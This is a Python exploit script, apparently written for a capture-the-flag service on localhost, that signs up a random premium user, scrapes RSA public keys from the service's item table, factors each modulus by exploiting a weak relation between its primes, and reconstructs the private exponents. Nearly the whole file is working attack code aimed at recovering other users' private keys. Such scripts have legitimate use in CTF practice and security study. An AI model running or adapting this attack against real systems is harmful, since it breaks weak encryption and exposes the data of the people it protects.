import requests
import logging
import random
import string
from bs4 import BeautifulSoup
import sympy
import binascii
import gmpy2
import time

logger = logging.getLogger(__name__)
# Create a requests session
session = requests.Session()

def signup(user_name, password, user_type='REGULAR'):
    logger.info(f"Starting signup process for user: {user_name}")
    signup_data = {
        "user_name": user_name,
        "password": password,
        "user_type": user_type,
        "action": "signup"
    }
    response = session.post("http://localhost:8181/", data=signup_data)
    status_code = response.status_code
    logger.info(f"Received status code {status_code} for signup process")
    
    if status_code in [200, 302]:
        # Check if a redirection occurred
        if 'Location' in response.headers:
            new_url = response.headers['Location']
            response = requests.get(new_url)  # Fetch the redirected page
            status_code = response.status_code
            logger.info(f"Received status code {status_code} for redirected page")


        if user_type == 'PREMIUM':
            # Parse the private key and user_id from the response
            soup = BeautifulSoup(response.text, 'html.parser')
            private_key_elements = soup.find_all('p', class_='key-chunk')
            private_key = ''.join(element.text for element in private_key_elements)
            
            user_id_element = soup.find('input', id='userId')
            user_id = user_id_element['value'] if user_id_element else None 
            
            logger.info(f"Parsed private key: {private_key} and user_id: {user_id}")
            return private_key, user_id
        elif user_type == 'REGULAR':   
            return 
        else: 
            logger.error(f"Invalid user type: {user_type}")
            raise Exception(f"Invalid user type: {user_type}")
    else:
        logger.error(f"Failed to sign up the user. {status_code}")
        raise Exception(f"Failed to sign up the user. {status_code}")


def scrape_webpage():
    page_number = 1
    premium_items = []

    while True:
        url = f"http://localhost:8181/user_index.php?page={page_number}"
        #logger.info("scrape_webpage: Starting to scrape webpage: %s", url)
        response = session.get(url)

        if response.status_code != 200:
            #logger.error("scrape_webpage: Failed to fetch page: %s", url)
            raise Exception(f"Failed to fetch page: {url}")

        #logger.info("scrape_webpage: Successful request. Parsing content with BeautifulSoup.")
        soup = BeautifulSoup(response.text, 'html.parser')
        table = soup.find('table')

        if table is None:
            #logger.error("scrape_webpage: No table found in the page.")
            raise Exception("No table found in the page.")

        rows = table.find_all('tr')

        if not rows:
            #logger.error("scrape_webpage: No rows found in the table.")
            raise Exception("No rows found in the table.")

        #logger.info("scrape_webpage: Iterating through table rows.")

        for row in rows:
            cols = row.find_all('td')
            if not cols:
                continue

            cols = [col.text.strip() for col in cols]
            item_name = cols[0]
            item_start_price = cols[1]
            rsa_e_button = row.find_all('td')[5].find('button')
            rsa_n_button = row.find_all('td')[6].find('button')

            if cols[2].strip().upper() != 'PREMIUM':
                continue

            #logger.info("scrape_webpage: Found a PREMIUM item.")

            rsa_e_key = rsa_e_button['onclick'].strip("alert('')") if rsa_e_button else None
            rsa_n_key = rsa_n_button['onclick'].strip("alert('')") if rsa_n_button else None

            if rsa_e_key and rsa_n_key:
                premium_items.append((item_name, item_start_price, cols[2], rsa_e_key, rsa_n_key))
       

        #logger.info("scrape_webpage: Finished scraping. Found %s PREMIUM items.", len(premium_items))

        next_button = soup.find('a', text='Next') 
        if next_button is None:
            break

        page_number += 1

    return premium_items

def bisect(f, low, up, rounding = 0):
	flow = f(low)
	fup = f(up)
	if flow == 0: return low
	if fup == 0: return up
	if flow * fup > 0: raise ValueError('bad interval')
	if flow < 0:
		return _bisect(f, low,up,rounding)
	else:
		return _bisect(lambda x: -f(x), low, up,rounding)


def _bisect(f, low, up, rounding):
	"""Find root by bisection. Require: f(low) < 0 < f(up)."""
	if up <= low + 1:
		if rounding == 1:
			return up
		elif rounding == -1:
			return low
		else:
			raise ValueError('no root or bad function')
	mid = (low + up) // 2
	midval = f(mid)
	if midval == 0: return mid
	if midval < 0: return _bisect(f, mid, up, rounding)
	if midval > 0: return _bisect(f, low, mid, rounding)


def calculate_p_and_q(n):
    logger.debug(f"calculate_p_and_q: Received n: {n}")

    # check if n is a positive integer
    if not isinstance(n, int) or n <= 0:
        logger.error(f"Invalid input for n: {n}. Must be a positive integer.")
        return None, None

    for offset in range(10, 2048, 2):
        try:
            f = lambda x: x * (x * (x+offset)) - n
            p = bisect(f, 0, 1<<512, rounding = 0)
            q = sympy.nextprime(n // (p * (p+offset)))
            logger.debug(f"Function calculate p and q. My f: {f} and p: {p} and q: {q}")
            return p, q
        except ValueError:
            logger.debug(f"ValueError encountered for offset {offset}")
            continue


def generate_private_key(p, q, e):
    logger.debug(f"generate_private_key: Started calculations.")
    
    logger.debug(f"generate_private_key: Received p: {p}")
    logger.debug(f"generate_private_key: Received q: {q}")
    logger.debug(f"generate_private_key: Received e: {e}")

    # Convert e to an integer
    e = int(e)
    logger.debug(f"generate_private_key: Converted e to an integer: {e}")

    n = p * q
    logger.debug(f"generate_private_key: Calculated n as p*q: {n}")

    totient = (p - 1) * (q - 1)
    logger.debug(f"generate_private_key: Calculated totient as (p - 1)*(q - 1): {totient}")

    d = pow(e, -1, totient)
    logger.debug(f"generate_private_key: Calculated d as e^-1 mod totient: {d}")

    return d, n


def decrypt(ciphertext, private_key):
    ciphertext_int = int(ciphertext)
    d, n = private_key
    plaintext_int = pow(ciphertext_int, d, n)
    plaintext_hex = hex(plaintext_int)[2:] 
    plaintext = binascii.unhexlify(plaintext_hex).decode()
    return plaintext


def exploit():
    user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    password = ''.join(random.choices(string.ascii_lowercase, k=10))
    logger.debug(f"Generated user_name: {user_name}")
    logger.debug(f"Generated password: {password}")

    private_key, user_id = signup(user_name, password, 'PREMIUM')  

    premium_items = scrape_webpage()
     # log the premium items
    for item in premium_items:
        logger.info(f"Found premium item: {item}")
        logger.info(f"Item index 4 is: {item[4]}")
        pq = calculate_p_and_q(int(item[4])) 
        if pq is None:
            logger.error(f"Failed to calculate p and q for item: {item}")
            continue
        p, q = pq
        # log the calculated p and q
        logger.info(f"Calculated p: {p} and q: {q}")
        reconstructed_private_key = generate_private_key(p, q, item[3])
        logger.info(f"Reconstructed private key: {reconstructed_private_key}")





if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    # Starte den Timer
    start_time = time.time()
    exploit()
     # Beende den Timer und berechne die Laufzeit
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Gib die Laufzeit aus
    print("Laufzeit: {:.2f} Sekunden".format(execution_time))
